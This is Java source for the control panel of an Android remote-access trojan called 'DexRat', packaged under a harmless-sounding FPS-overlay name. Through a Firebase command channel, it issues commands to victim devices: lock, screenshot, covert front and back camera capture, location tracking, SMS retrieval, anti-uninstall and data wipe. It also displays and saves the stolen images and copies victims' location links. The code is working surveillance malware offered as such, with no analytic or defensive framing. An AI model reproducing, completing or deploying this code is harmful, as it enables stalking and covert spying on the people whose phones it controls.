package com.bluestacks.fpsoverlay.controller;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.database.ServerValue;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private FirebaseDatabase db;
    private String selectedId = "all";
    private DatabaseReference currentDataRef;
    private ValueEventListener currentDataListener;
    
    private Spinner deviceSpinner;
    private ImageView liveView;
    private TextView statusText, logText, placeholder, lastSeenText;
    private View statusIndicator;
    private View tabControl, tabMedia, tabSystem;
    private String lastLocString = "";
    private Bitmap currentBitmap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initUI();
        db = FirebaseDatabase.getInstance();
        listenDevices();
    }

    private void initUI() {
        deviceSpinner = findViewById(R.id.deviceSpinner);
        liveView = findViewById(R.id.liveView);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        placeholder = findViewById(R.id.placeholder);
        lastSeenText = findViewById(R.id.lastSeenText);
        statusIndicator = findViewById(R.id.statusIndicator);

        tabControl = findViewById(R.id.tab_control);
        tabMedia = findViewById(R.id.tab_media);
        tabSystem = findViewById(R.id.tab_system);

        com.google.android.material.tabs.TabLayout tabs = findViewById(R.id.tabLayout);
        tabs.addOnTabSelectedListener(new com.google.android.material.tabs.TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(com.google.android.material.tabs.TabLayout.Tab tab) {
                tabControl.setVisibility(View.GONE);
                tabMedia.setVisibility(View.GONE);
                tabSystem.setVisibility(View.GONE);
                switch (tab.getPosition()) {
                    case 0: tabControl.setVisibility(View.VISIBLE); break;
                    case 1: tabMedia.setVisibility(View.VISIBLE); break;
                    case 2: tabSystem.setVisibility(View.VISIBLE); break;
                }
            }
            @Override public void onTabUnselected(com.google.android.material.tabs.TabLayout.Tab tab) {}
            @Override public void onTabReselected(com.google.android.material.tabs.TabLayout.Tab tab) {}
        });

        findViewById(R.id.btnClear).setOnClickListener(v -> {
            liveView.setImageBitmap(null);
            currentBitmap = null;
            placeholder.setVisibility(View.VISIBLE);
            if (currentDataRef != null) {
                currentDataRef.child("camera").removeValue();
                currentDataRef.child("screenshot").removeValue();
            }
        });

        findViewById(R.id.btnDownload).setOnClickListener(v -> saveImage());
        findViewById(R.id.btnLock).setOnClickListener(v -> sendCmd("lock"));
        findViewById(R.id.btnUnlock).setOnClickListener(v -> sendCmd("unlock"));
        findViewById(R.id.btnScreenshot).setOnClickListener(v -> sendCmd("screenshot"));
        findViewById(R.id.btnFrontCam).setOnClickListener(v -> sendCmd("camera_front"));
        findViewById(R.id.btnBackCam).setOnClickListener(v -> sendCmd("camera_back"));
        findViewById(R.id.btnLocation).setOnClickListener(v -> sendCmd("location"));
        
        Button btnAnti = findViewById(R.id.btnAntiUninstall);
        btnAnti.setOnClickListener(v -> {
            if (currentDataRef == null) {
                Toast.makeText(this, "Select a device first", Toast.LENGTH_SHORT).show();
                return;
            }
            boolean currentState = btnAnti.getText().toString().contains("ON");
            sendCmd("anti_uninstall:" + (currentState ? "off" : "on"));
        });

        findViewById(R.id.btnSMS).setOnClickListener(v -> {
            if (currentDataRef == null) { Toast.makeText(this, "Select a device first", Toast.LENGTH_SHORT).show(); return; }
            sendCmd("sms");
            new SmsModule(this, currentDataRef).showDialog();
        });

        findViewById(R.id.btnWipe).setOnClickListener(v -> {
            if (currentDataRef == null) { Toast.makeText(this, "Select a device first", Toast.LENGTH_SHORT).show(); return; }
            new androidx.appcompat.app.AlertDialog.Builder(this)
                    .setTitle("Wipe Data")
                    .setMessage("Are you sure you want to clear all data for this device (Photos, SMS, Files, etc.)?")
                    .setPositiveButton("WIPE", (dialog, which) -> {
                        currentDataRef.removeValue().addOnSuccessListener(aVoid -> {
                            liveView.setImageBitmap(null);
                            currentBitmap = null;
                            placeholder.setVisibility(View.VISIBLE);
                            addLog("Wipe Success: " + selectedId);
                            Toast.makeText(this, "Data wiped successfully", Toast.LENGTH_SHORT).show();
                        });
                    })
                    .setNegativeButton("CANCEL", null)
                    .show();
        });

        deviceSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                String item = (String) parent.getItemAtPosition(position);
                if (item.equals("ALL DEVICES")) {
                    selectedId = "all";
                    if (currentDataRef != null && currentDataListener != null) {
                        currentDataRef.removeEventListener(currentDataListener);
                    }
                    currentDataRef = null;
                    statusIndicator.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF9E9E9E));
                    lastSeenText.setText("Status: N/A");
                } else {
                    selectedId = item.substring(item.lastIndexOf("[") + 1, item.lastIndexOf("]"));
                    listenData(selectedId);
                }
                statusText.setText("Target: " + selectedId);
            }
            @Override public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private void sendCmd(String cmd) {
        Map<String, Object> m = new HashMap<>();
        m.put("cmd", cmd);
        m.put("target", selectedId);
        m.put("t", ServerValue.TIMESTAMP);
        db.getReference("commands").setValue(m);
        addLog("Sent: " + cmd + " -> " + selectedId);
    }

    private List<String> lastDeviceList = new ArrayList<>();

    private void listenDevices() {
        db.getReference("devices").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<String> newList = new ArrayList<>();
                newList.add("ALL DEVICES");
                int selectedPos = 0;
                int count = 1;
                long now = System.currentTimeMillis();
                
                for (DataSnapshot ds : snapshot.getChildren()) {
                    Long lastSeen = ds.child("last_seen").getValue(Long.class);
                    // Filter offline (> 1 menit)
                    boolean isOnline = lastSeen != null && (now - lastSeen) < 60000;
                    
                    String id = ds.getKey();
                    String name = ds.child("name").getValue(String.class);
                    String item = (isOnline ? "● " : "○ ") + name + " [" + id + "]";
                    newList.add(item);
                    if (id != null && id.equals(selectedId)) {
                        selectedPos = count;
                        updateStatusInfo(isOnline, lastSeen);
                    }
                    count++;
                }

                if (!newList.equals(lastDeviceList)) {
                    lastDeviceList = new ArrayList<>(newList);
                    ArrayAdapter<String> adapter = new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_spinner_item, newList) {
                        @NonNull @Override
                        public View getView(int position, android.view.View convertView, @NonNull android.view.ViewGroup parent) {
                            TextView v = (TextView) super.getView(position, convertView, parent);
                            v.setTextColor(getResources().getColor(R.color.onPrimaryContainer));
                            v.setTextSize(14);
                            return v;
                        }
                    };
                    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                    
                    AdapterView.OnItemSelectedListener tempListener = deviceSpinner.getOnItemSelectedListener();
                    deviceSpinner.setOnItemSelectedListener(null);
                    deviceSpinner.setAdapter(adapter);
                    deviceSpinner.setSelection(Math.min(selectedPos, newList.size() - 1));
                    deviceSpinner.setOnItemSelectedListener(tempListener);
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private void updateStatusInfo(boolean isOnline, Long lastSeen) {
        statusIndicator.setBackgroundTintList(android.content.res.ColorStateList.valueOf(isOnline ? 0xFF2E7D32 : 0xFFB3261E));
        if (lastSeen != null) {
            long diff = (System.currentTimeMillis() - lastSeen) / 1000;
            if (diff < 60) lastSeenText.setText("Last seen: Just now");
            else lastSeenText.setText("Last seen: " + (diff / 60) + "m ago");
        }
    }

    private void listenData(String id) {
        if (currentDataRef != null && currentDataListener != null) {
            currentDataRef.removeEventListener(currentDataListener);
        }
        currentDataRef = db.getReference("data").child(id);
        currentDataListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.hasChild("camera")) updateImage(snapshot.child("camera").getValue(String.class));
                else if (snapshot.hasChild("screenshot")) updateImage(snapshot.child("screenshot").getValue(String.class));

                // Update config buttons state
                DataSnapshot config = snapshot.child("config");
                if (config.exists()) {
                    boolean antiOn = config.child("anti_uninstall").getValue(Boolean.class) != null && config.child("anti_uninstall").getValue(Boolean.class);
                    Button btnAnti = findViewById(R.id.btnAntiUninstall);
                    btnAnti.setText("Anti-Uninstall: " + (antiOn ? "ON" : "OFF"));
                    btnAnti.setBackgroundTintList(android.content.res.ColorStateList.valueOf(antiOn ? 0xFFEADDFF : 0xFFE7E0EC));
                    btnAnti.setTextColor(antiOn ? 0xFF21005D : 0xFF49454F);
                }

                if (snapshot.hasChild("location")) {
                    try {
                        DataSnapshot locSnap = snapshot.child("location");
                        String lat = String.valueOf(locSnap.child("lat").getValue());
                        String lng = String.valueOf(locSnap.child("lng").getValue());
                        String url = locSnap.child("url").getValue(String.class);
                        String locStr = lat + "," + lng;

                        if (!locStr.equals(lastLocString)) {
                            addLog("New Loc: " + locStr);
                            lastLocString = locStr;
                            if (url != null) {
                                copyToClipboard(url);
                                snapshot.child("location").getRef().removeValue();
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        };
        currentDataRef.addValueEventListener(currentDataListener);
    }

    private void updateConfigButton(int id, String offText, String onText, boolean isOn) {
        Button btn = findViewById(id);
        btn.setText(isOn ? onText : offText);
        btn.setBackgroundTintList(android.content.res.ColorStateList.valueOf(isOn ? 0xFFFF4444 : 0xFF1A1A1A));
        btn.setTextColor(isOn ? 0xFFFFFFFF : 0xFF00FF41);
    }

    private void updateImage(String b64) {
        if (b64 == null || b64.isEmpty()) return;
        try {
            byte[] decodedString = Base64.decode(b64.trim(), Base64.DEFAULT);
            Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
            if (decodedByte != null) {
                runOnUiThread(() -> {
                    currentBitmap = decodedByte;
                    liveView.setImageBitmap(decodedByte);
                    placeholder.setVisibility(View.GONE);
                });
            }
        } catch (Exception ignored) {}
    }

    private void saveImage() {
        if (currentBitmap == null) return;
        try {
            String fileName = "IMG_" + System.currentTimeMillis() + ".jpg";
            android.content.ContentValues v = new android.content.ContentValues();
            v.put(android.provider.MediaStore.Images.Media.DISPLAY_NAME, fileName);
            v.put(android.provider.MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                v.put(android.provider.MediaStore.Images.Media.RELATIVE_PATH, android.os.Environment.DIRECTORY_PICTURES + "/DexRat");
            }
            android.net.Uri uri = getContentResolver().insert(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, v);
            if (uri != null) {
                java.io.OutputStream out = getContentResolver().openOutputStream(uri);
                currentBitmap.compress(Bitmap.CompressFormat.JPEG, 100, out);
                if (out != null) out.close();
                Toast.makeText(this, "Saved to Pictures/DexRat", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception ignored) {}
    }

    private void addLog(String msg) {
        runOnUiThread(() -> {
            String current = logText.getText().toString();
            logText.setText(msg + "\n" + current);
        });
    }

    private void copyToClipboard(String text) {
        runOnUiThread(() -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("Location URL", text);
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this, "Location URL copied!", Toast.LENGTH_SHORT).show();
            }
        });
    }
}